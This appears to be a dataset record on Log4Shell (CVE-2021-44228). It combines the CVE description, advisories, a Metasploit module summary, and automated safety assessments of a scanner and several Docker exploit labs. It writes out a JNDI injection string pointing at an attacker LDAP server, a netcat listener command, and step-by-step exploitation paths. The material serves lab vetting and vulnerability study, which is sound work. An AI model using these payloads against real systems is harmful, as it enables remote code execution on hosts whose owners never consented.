title.value: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints

description.value: Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

items.title: Log4Shell HTTP Header Injection
items.description:
Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,
        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.

        This module will exploit an HTTP end point with the Log4Shell vulnerability by injecting a format message that
        will trigger an LDAP connection to Metasploit and load a payload.

        The Automatic target delivers a Java payload using remote class loading. This requires Metasploit to run an HTTP
        server in addition to the LDAP server that the target can connect to. The targeted application must have the
        trusted code base option enabled for this technique to work.

        The non-Automatic targets deliver a payload via a serialized Java object. This does not require Metasploit to
        run an HTTP server and instead leverages the LDAP server to deliver the serialized object. The target
        application in this case must be compatible with the user-specified JAVA_GADGET_CHAIN option.

items.name: Apache Log4j2 Remote Code Injection
items.description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
items.impact: Successful exploitation of this vulnerability can lead to remote code execution, potentially compromising the affected system.
items.remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).

items.name: Cisco CloudCenter Suite (Log4j) - Remote Code Execution
items.description: Cisco CloudCenter Suite is susceptible to remote code execution via the Apache Log4j library. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI-related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
items.remediation: From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.

items.name: Citrix XenMobile Server - Remote Code Execution (Apache Log4j)
items.description: XenMobile Server is an on-premises enterprise mobility management solution and versions 10.14 RP2, 10.13 RP5 and 10.12 RP10 are vulnerable to CVE-2021-44228 (Apache Log4j). JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

components.name: log4j-scan.py
components.description: Python script that sends HTTP requests with JNDI injection payloads to target URLs, fuzzing headers and POST data. It uses DNS callbacks (interact.sh by default) to detect out-of-band interactions indicating vulnerability.

components.name: headers files (headers.txt, headers-minimal.txt, headers-large.txt)
components.description: Text files containing HTTP header names used by the scanner to inject payloads into various request headers.

components.name: requirements.txt
components.description: Lists Python packages required by the scanner: requests, termcolor, PyCryptodome, dnslib.

components.name: Dockerfile
components.description: Defines the container image based on python:3.11.0a5-alpine, installs build tools and Python dependencies, copies the scanner code, and sets the entrypoint to run log4j-scan.py.

limitations: The packet does not include a docker-compose.yml or explicit lab topology; only a standalone Dockerfile is present.
The scanner's behavior depends on external DNS callback services (interact.sh) or user-provided callback hosts, which are outside the packet's scope.
No target application or vulnerable Log4j instance is included; the environment is purely a scanning tool.

exercise_path.description: Build the Docker image using the provided Dockerfile.
Run the container with target URL(s) and desired options (e.g., --run-all-tests, --waf-bypass, --test-CVE-2021-45046).
The scanner sends HTTP requests with JNDI injection payloads to the target(s).
Wait for DNS callbacks and check logs to confirm vulnerability.

prerequisites.description: Target URLs must be provided via -u or -l arguments.
A DNS callback service (interact.sh by default) or custom callback host must be reachable for vulnerability confirmation.
Python dependencies (requests, termcolor, PyCryptodome, dnslib) must be installed.

safety_reason.description: The scanner only sends HTTP requests with JNDI payloads to user-specified targets and uses DNS callbacks for detection. It does not attempt to exploit the host, persist, steal credentials, or connect to external systems beyond the documented callback service. No hidden or destructive behavior is visible.

lab_assessment.description: The Dockerfile and included Python script are explicitly designed to scan for Log4j RCE vulnerabilities (CVE-2021-44228, CVE-2021-45046). The README and script describe fuzzing, DNS callbacks, and WAF bypass payloads for vulnerability detection.

cve_assessments.description: The scanner is explicitly designed to detect CVE-2021-44228. The script's banner, payloads, and README all reference this CVE.
The scanner includes a dedicated payload list and command-line flag (--test-CVE-2021-45046) for detecting CVE-2021-45046, a patch bypass for Log4j 2.15.0.

environment_summary.description: A Dockerized Python scanner for detecting Apache Log4j RCE vulnerabilities (CVE-2021-44228, CVE-2021-45046). The environment builds a container from python:3.11.0a5-alpine, installs dependencies, and runs log4j-scan.py as the entrypoint.

components.name: web
components.description: A Spring Boot web application that uses Log4j 2.14.1 and logs user-controlled input via several endpoints, making it vulnerable to JNDI injection.

components.name: jndi
components.description: A Java application that starts an LDAP server on port 1389 and responds to JNDI lookups with a reference to a remote codebase, directing the vulnerable client to load a class from the provider service.

components.name: provider
components.description: A Spring Boot web application on port 8081 that accepts Java source code via a web form, compiles it, and serves the resulting .class file. It is used to host the malicious Exploit class that the JNDI reference points to.

components.name: startup.sh
components.description: A shell script that starts the provider, web, and jndi services in the background, with the jndi server configured to point to the provider's URL.

limitations: Six binary screenshot files are uninspected; their content cannot be verified.
The Dockerfile uses a multi-stage build and copies pre-built JARs; the source code for the JNDI and provider services is present, but the compiled JARs are not inspected.
The README mentions a disclaimer for educational purposes only, but the actual behavior of the compiled code is not verified beyond the provided source.

exercise_path.description: Build the Docker image using the provided Dockerfile.
Run the container, exposing ports 8080 and 8081.
Access the provider web interface at http://127.0.0.1:8081/ and submit the exploit code template.
Access the vulnerable web application at http://127.0.0.1:8080/ and send a JNDI lookup string (e.g., ${jndi:ldap://127.0.0.1:1389/Exploit}) via the /logAction endpoint.
Observe the exploit result: on Windows, Calculator opens; on Linux/Mac, a file named PWNED is created in /tmp.

prerequisites.description: Docker must be installed to build and run the image.
The vulnerable application requires Java 8 or later; the Dockerfile uses openjdk:11.
The JNDI LDAP server and provider must be reachable from the vulnerable application; the startup script configures them on localhost.

safety_reason.description: All visible behavior is directed at the contained lab environment. The exploit payload creates a file in /tmp or launches Calculator, which are expected demonstrations of the vulnerability. No evidence of host escape, external connectivity, persistence, credential theft, or unnecessary compromise is present.

lab_assessment.description: The README explicitly states it is a CVE-2021-44228 POC, the web project includes a vulnerable Log4j version (2.14.1), and the Dockerfile builds and runs all components needed to demonstrate the vulnerability.

cve_assessments.description: The web project explicitly depends on log4j-core 2.14.1, which is within the affected range (2.0-beta9 to 2.14.1) stated in the README. The LogController logs user-controlled input without sanitization, enabling JNDI injection.

environment_summary.description: A Dockerized proof-of-concept environment for CVE-2021-44228 (Log4Shell). It builds and runs three Java services: a vulnerable web application using Log4j 2.14.1, a JNDI LDAP reference server, and a code compiler/provider server that serves a user-supplied exploit class.

components.name: Vulnerable Spring Boot Application
components.description: A Spring Boot web application that logs the X-Api-Version request header using Log4j. The logged string is not sanitized against JNDI lookups, making it vulnerable to Log4Shell. It listens on port 8080.

components.name: Dockerfile
components.description: Multi-stage Dockerfile that builds the application with Gradle 7.3.1 and JDK 17, then runs it on OpenJDK 8u181 Alpine. Exposes port 8080.

components.name: Gradle Build Configuration
components.description: Declares dependencies including spring-boot-starter-log4j2 2.6.1, which pulls in Log4j 2.14.1, a version known to be vulnerable to CVE-2021-44228.

components.name: Exploitation Instructions (README)
components.description: Provides step-by-step instructions to exploit the vulnerability using JNDIExploit, including commands to start a malicious LDAP server and trigger remote code execution.

limitations: Two binary files (screenshot.png and gradle-wrapper.jar) are uninspected; their behavior cannot be assessed.
The packet does not include a docker-compose.yml or runtime configuration beyond the Dockerfile, so port mappings and privileged mode are not visible.
The README references an external JNDIExploit tool and a Wayback Machine download link, but these are not part of the supplied evidence and are not executed by the lab itself.

exercise_path.description: Run the vulnerable application container using the provided Docker command.
Download and start the JNDIExploit malicious LDAP server on the attacker's machine.
Send a crafted HTTP request with a JNDI lookup string in the X-Api-Version header to trigger the vulnerability.
Verify remote code execution by checking for the created file /tmp/pwned inside the container.

prerequisites.description: Docker must be installed to build and run the container.
A malicious LDAP server (JNDIExploit) must be set up on a reachable host to serve the exploit payload.
The attacker must be able to send HTTP requests to the vulnerable application (e.g., using curl).

safety_reason.description: All visible behavior is directed at the lab's own vulnerable target. The Dockerfile only builds and runs the application; it does not contain hidden commands, host escape mechanisms, or external connections. The exploitation steps in the README are a documented exercise that targets the container itself. No evidence of persistence, credential theft, data destruction, or backdoor behavior is present.

lab_assessment.description: The README explicitly labels the application as 'vulnerable to CVE-2021-44228' and provides exploitation steps using a malicious LDAP server. The build manifest includes a vulnerable Log4j version (2.14.1 via spring-boot-starter-log4j2 2.6.1) and the source code logs user-controlled input, which is the classic Log4Shell trigger.

cve_assessments.description: The README explicitly states the application is vulnerable to CVE-2021-44228. The build manifest includes Log4j 2.14.1 (via spring-boot-starter-log4j2 2.6.1), and the source code logs unsanitized user input, which is the classic attack vector for this CVE.

environment_summary.description: A Spring Boot web application containerized with a multi-stage Docker build. The application uses Log4j 2.14.1 and JDK 1.8.0_181, and the README explicitly states it is a sample vulnerable application for CVE-2021-44228 (Log4Shell).

components.name: victim
components.description: A Java HTTP service listening on port 8080 that logs the User-Agent header using Log4j 2.14.1, which evaluates JNDI lookups. It runs on JDK 8u181 with remote class loading enabled, making it susceptible to the Log4Shell exploit.

components.name: attacker
components.description: A container that builds the marshalsec toolkit, compiles a malicious Exploit.java payload, and runs an LDAP referral server on port 1389 and an HTTP server on port 8888 to deliver the payload class to the victim.

components.name: log4net
components.description: A user-defined bridge network that connects the victim and attacker containers, allowing them to communicate by service name while isolating the lab from other networks.

exercise_path.description: Build and start the lab with 'docker compose up --build' from the log4shell-lab directory.
Wait for the victim and attacker services to indicate they are ready.
Trigger the exploit by sending an HTTP request with a malicious User-Agent header containing a JNDI lookup to the victim's port 8080.
Verify remote code execution by checking for the creation of /tmp/pwned.txt inside the victim container.

prerequisites.description: Docker Engine and Compose v2 must be installed.
Internet access is required for the first build to pull base images and clone/compile marshalsec from GitHub.
The victim container must be running with the vulnerable Log4j version and JDK 8u181 with trustURLCodebase=true.

safety_reason.description: The lab is self-contained within Docker containers on a private bridge network. The exploit payload only writes a proof-of-execution file (/tmp/pwned.txt) inside the victim container and does not contact external systems, persist beyond the container, or affect the host. Port mappings are necessary for demonstration and do not indicate malicious intent.

lab_assessment.description: The README explicitly states it is a proof-of-concept lab for CVE-2021-44228, the Dockerfiles build a vulnerable application and an attacker toolkit, and the Compose file orchestrates them on an isolated network for demonstration purposes.

cve_assessments.description: The lab explicitly targets CVE-2021-44228. The victim uses Log4j 2.14.1 (a vulnerable version), the application logs attacker-controlled input via Log4j, and the exploit chain matches the known JNDI injection vector. The README, pom.xml, and source code all reference this CVE.

environment_summary.description: An isolated Docker Compose lab that reproduces the Log4Shell (CVE-2021-44228) remote code execution vulnerability. It consists of a victim service running a vulnerable Java application with Log4j 2.14.1 on JDK 8u181, and an attacker service hosting a malicious LDAP referral server and an HTTP server with a compiled payload class.

components.name: solr-lab
components.description: Apache Solr 8.11.0 service from vulhub/solr:8.11.0, exposing port 8983. The README identifies it as the vulnerable target running a vulnerable version of Log4j.

components.name: kali-lab
components.description: Kali Linux container built from kalilinux/kali-last-release:latest with curl, iputils-ping, nmap, and netcat-traditional installed. It depends on solr-lab and is used to execute the PoC exploit and monitor the LDAP callback.

components.name: poc.sh
components.description: A bash script that sends a crafted HTTP request to the Solr admin API with a JNDI lookup payload (${jndi:ldap://...}) to trigger the Log4Shell vulnerability. It takes attacker IP, target IP, and optional port as arguments.

limitations: The vulhub/solr:8.11.0 image is not inspected; its internal configuration and exact Log4j version are unknown.

The poc.sh script is present in the repository root but not explicitly copied into the attacker container; the README assumes it is available inside kali-lab, which may require a volume mount or manual copy not shown in the Compose file.
No Docker network configuration is defined; the default bridge network behavior is assumed but not verified.

exercise_path.description: Start the lab environment with 'docker compose up -d --build'.
Enter the attacker container with 'docker compose exec -it kali-lab /bin/bash'.
Discover the internal network and locate the Solr target IP using hostname -I and nmap.
Optionally start a netcat listener on the attacker container to observe the LDAP callback: 'nc -lnvp 1389'.
Make poc.sh executable and run it with the attacker and target IPs: './poc.sh <KALI_IP> <SOLR_IP> 1389'.
Observe the Solr server attempting an LDAP connection back to the attacker, confirming the vulnerability.

prerequisites.description: Docker and Docker Compose must be installed on the host to build and run the environment.
The attacker must know the internal IP addresses of the kali-lab and solr-lab containers, obtained via hostname -I and nmap scanning inside the kali-lab container.
The poc.sh script must be made executable (chmod +x) and executed with the correct attacker and target IPs.

safety_reason.description: All visible behavior is directed at the intended lab target (solr-lab) within the Docker network. The PoC script sends a single HTTP request to the Solr admin API to trigger a JNDI lookup; no host escape, external connectivity, persistence, credential theft, or destructive actions are present. The port mapping (8983:8983) is a standard lab requirement to access the Solr service. The attacker container is built from an official Kali image with only basic network tools added. No hidden or unnecessary behavior is observed.

lab_assessment.description: The README explicitly states the environment is a controlled Docker lab to reproduce and study the Log4Shell vulnerability (CVE-2021-44228) in Apache Solr. It provides a proof-of-concept script (poc.sh) that sends a JNDI lookup payload to the Solr admin API, and instructions for monitoring the LDAP callback. The Compose file defines a vulnerable Solr image and an attacker container with network tools, consistent with a vulnerability research exercise.

cve_assessments.description: The README explicitly names CVE-2021-44228 (Log4Shell) as the vulnerability being reproduced. The PoC script sends a JNDI lookup payload to the Solr admin API, which is the classic Log4Shell attack vector. The target is Apache Solr 8.11.0, which is known to bundle a vulnerable Log4j version. The mitigation section describes standard Log4Shell fixes.

environment_summary.description: A Docker Compose environment with two services: a vulnerable Apache Solr 8.11.0 target (solr-lab) and a Kali Linux attacker container (kali-lab) with network tools pre-installed. The README describes it as a controlled lab to reproduce and study the Log4Shell vulnerability (CVE-2021-44228) in Apache Solr.
